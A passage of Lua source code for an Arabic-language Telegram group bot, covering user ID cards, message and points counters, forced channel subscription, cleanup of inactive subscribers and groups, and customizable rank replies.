𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
𝟓 𝟔 𖡻 #msgs  ࿇🦄
𝟓 𝟔 𖡻 #auto  ࿇🦄
𝟓 𝟔 𖡻 #stast  ࿇🦄
𝟓 𝟔 𖡻 #id  ࿇🦄
𝟓 𝟔 𖡻 𝗖𝗛 - @SOPOWERB0T 🦅
]]}
local Text_Rand = List[math.random(#List)]
database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
send(msg.chat_id_, msg.id_,'⋄تم تغير الايدي ارسل ايدي لرؤيته')
end
if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,sofi,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (sofi.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local sofia = {
" ⋄اروح فـدوه للـحلوين",
" ⋄حلوة حبيبي معليك بالمضغوطين",
" ⋄جهرتك منورة ",
" ⋄هاي شكد حلو انتة",
" ⋄اصلا صوفي احلئ",
" ⋄اصلا روظي احلئ",
" ⋄فديت الصاك محح",
" ⋄فـدشـي عمـي",
" ⋄دغـيرهـا شبـي هـاذ",
" ⋄شهل الگيمر ",
" ⋄شهل الصوره تخمبش ",
" ⋄فديت الحلو ",
" ⋄بـبكن حـلك ",
}
local rdphoto = sofia[math.random(#sofia)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n⋄ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n⋄ايديك ~⪼ '..msg.sender_user_id_..'\n⋄معرفك ~⪼ '..username..'\n⋄رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⋄موقعك ~⪼ '..rtpa..'\n⋄تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⋄رسائلك ~⪼ '..Msguser..'\n⋄نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⋄السحكات ~⪼ '..edit..'\n⋄نقاطك ~⪼ '..NUMPGAME..'\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n⋄ايديك ~⪼ '..msg.sender_user_id_..'\n⋄معرفك ~⪼ '..username..'\n⋄رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⋄موقعك ~⪼ '..rtpa..'\n⋄تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⋄رسائلك ~⪼ '..Msguser..'\n⋄نسبه  تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⋄السحكات ~⪼ '..edit..'\n⋄نقاطك ~⪼ '..NUMPGAME..']\n')
else
send(msg.chat_id_, msg.id_, '\n⋄الصوره ~⪼ ليس لديك صور في حسابك'..'[\n⋄ايديك ~⪼ '..msg.sender_user_id_..'\n⋄معرفك ~⪼ '..username..'\n⋄رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⋄موقعك ~⪼ '..rtpa..'\n⋄تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⋄رسائلك ~⪼ '..Msguser..'\n⋄نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⋄السحكات ~⪼ '..edit..'\n⋄نقاطك ~⪼ '..NUMPGAME..']\n')
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n⋄ايديك ~⪼ '..msg.sender_user_id_..'\n⋄معرفك ~⪼ '..username..'\n⋄رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⋄موقعك ~⪼ '..rtpa..'\n⋄تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n⋄رسائلك ~⪼ '..Msguser..'\n⋄نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n⋄السحكات ~⪼ '..edit..'\n⋄نقاطك ~⪼ '..NUMPGAME..']\n')
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end

if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = ' ⋄ليس لديك سحكات'
else
Text = ' ⋄عدد سحكاتك *»> { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "مسح سحكاتي" then  
send(msg.chat_id_, msg.id_,' ⋄تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "مسح جهاتي" then  
send(msg.chat_id_, msg.id_,' ⋄تم مسح جهاتك'  )  
database:del(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text == 'جهاتي' or text == 'شكد ضفت' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local Num = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if Num == 0 then 
Text = ' ⋄لم تقم بأضافه احد'
else
Text = ' ⋄عدد جهاتك *»> { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح المشتركين" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' ⋄لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' ⋄عدد المشتركين الان »> ( '..#pv..' )\n- تم ازالة »> ( '..sendok..' ) من المشتركين\n- الان عدد المشتركين الحقيقي »> ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "مسح الجروبات" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' ⋄لا يوجد جروبات وهميه في البوت\n')   
else
local Black = (w + q)
local sendok = #group - Black
if q == 0 then
Black = ''
else
Black = '\n- تم ازالة »> { '..q..' } جروبات من البوت'
end
if w == 0 then
Blackk = ''
else
Blackk = '\n- تم ازالة »> {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' ⋄عدد الجروبات الان »> { '..#group..' }'..Blackk..''..Black..'\n*- الان عدد الجروبات الحقيقي »> { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
return false
end

if text and text:match("^(المجموعه)$") or text and text:match("^معلومات الجروب$") then
function gpinfo(arg,data)
-- vardump(data) 
Blackdx(msg.chat_id_, msg.id_, ' ⋄ايدي المجموعة »> ( '..msg.chat_id_..' )\n⋄عدد الادمنيه »> ( *'..data.administrator_count_..' )*\n⋄عدد المحظورين »> ( *'..data.kicked_count_..' )*\n⋄عدد الاعضاء »> ( *'..data.member_count_..' )*\n', 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
-----------
if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " ⋄تم الغاء الامر ") 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
send(msg.chat_id_, msg.id_," ⋄تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " ⋄تم الغاء الامر ") 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, "☉| تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
sofi = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,sofi)  
database:setex(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, ' ⋄ارسل لي عدد الرسائل الان') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
sofi = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,sofi)  
database:setex(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, ' ⋄ارسل لي عدد النقاط التي تريد اضافتها') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_," ⋄تم اضافة له {"..Num..'} من النقاط')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\n⋄تم اضافة له {"..Num..'} من الرسائل')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text == 'نقاط' or text == 'نقاطي' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = ' ⋄لم تلعب اي لعبه للحصول على نقاط'
else
Text = ' ⋄عدد نقاطك التي ربحتها هيه *»> { '..Num..' } نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'نقاطه' or text == 'نقاطو' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0
if Num == 0 then 
Text = ' ⋄لم يلعب اي لعبه للحصول على نقاط'
else
Text = ' ⋄عدد نقاطه التي ربحتها هيه *»> { '..Num..' } نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n* ⋄لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,' ⋄ليس لديك نقاط في الالعاب\n⋄اذا كنت تريد ربح نقاط \n⋄ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n⋄ليس لديك نقاط في هذه لعبه \n⋄لزيادة نقاطك في اللعبه \n⋄ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,' ⋄تم خصم *»> { '..NUMPY..' }* من نقاطك \n⋄وتم اضافة* »> { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end

if text and text:match("^تغير رد المطور (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد المطور (.*)$") 
database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⋄تم تغير رد المطور الى »> "..Teext)
end
if text and text:match("^تغير رد المالك (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد المالك (.*)$") 
database:set(bot_id.."CoSu:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⋄تم تغير رد المالك الى »> "..Teext)
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد منشئ الاساسي (.*)$") 
database:set(bot_id.."BasicConstructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⋄تم تغير رد المنشئ الاساسي الى »> "..Teext)
end
if text and text:match("^تغير رد المنشئ (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⋄تم تغير رد المنشئ الى »> "..Teext)
end
if text and text:match("^تغير رد المدير (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد المدير (.*)$") 
database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_," ⋄تم تغير رد المدير الى »> "..Teext)
end
if text and text:match("^تغير رد الادمن (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد الادمن (.*)$") 
database:set(bot_id.."Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⋄تم تغير رد الادمن الى »> "..Teext)
end
if text and text:match("^تغير رد المميز (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد المميز (.*)$") 
database:set(bot_id.."Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⋄تم تغير رد المميز الى »> "..Teext)
end
if text and text:match("^تغير رد العضو (.*)$") and Manager2(msg) then
local Teext = text:match("^تغير رد العضو (.*)$") 
database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⋄تم تغير رد العضو الى »> "..Teext)
end

----------------------------------------------------------------- انتهئ الاوامر الجديدة
--[[
if database:get(bot_id..'token_info'..msg.chat_id_..''..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, '⋄تم الغاء امر معلومات التوكن ')
database:del(bot_id..'token_info'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
local url = https.request('https://api.telegram.org/bot'..token..'/getMe')
local json = JSON.decode(url)
local infotok =[[
⋄معلومات التوكن هي 
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄ اسم البوت ]..json.result.first_name..[[
⋄ معرف البوت ]..json.result.username..[[
⋄ ايدي البوت ]..json.result.id..[[
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]
end
send(msg.chat_id_, msg.id_, infotok)
database:del(bot_id..'token_info'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if text == 'معلومات التوكن' or text == 'جلب معلومات التوكن' then  
database:setex(bot_id.."token_info"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
send(msg.chat_id_, msg.id_, '⋄ارسل لي التوكن لجلب معلوماته ')
end
]]--

if text == 'الاوامر' and not database:get(bot_id.."coomand"..msg.chat_id_) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام الاوامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local Text =[[
اختر من الاوامر بلاسفل
َ
َ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end

if text == 'غنيلي' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
Num = math.random(8,83)
Mhm = math.random(108,143)
Mhhm = math.random(166,179)
Mmhm = math.random(198,216)
Mhmm = math.random(257,626)
local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
local Rrr = Texting[math.random(#Texting)]
local abc = msg.id_/2097152/0.5
https.request('https://api.telegram.org/bot'..token..'/sendAudio?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&audio=https://t.me/mmsst13/'..Rrr..'') 
end

if text == 'العاب متطوره' or text == 'الالعاب المتطوره' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام الالعاب')
return false
end
if AddChannel(msg.sender_user_id_) == false then
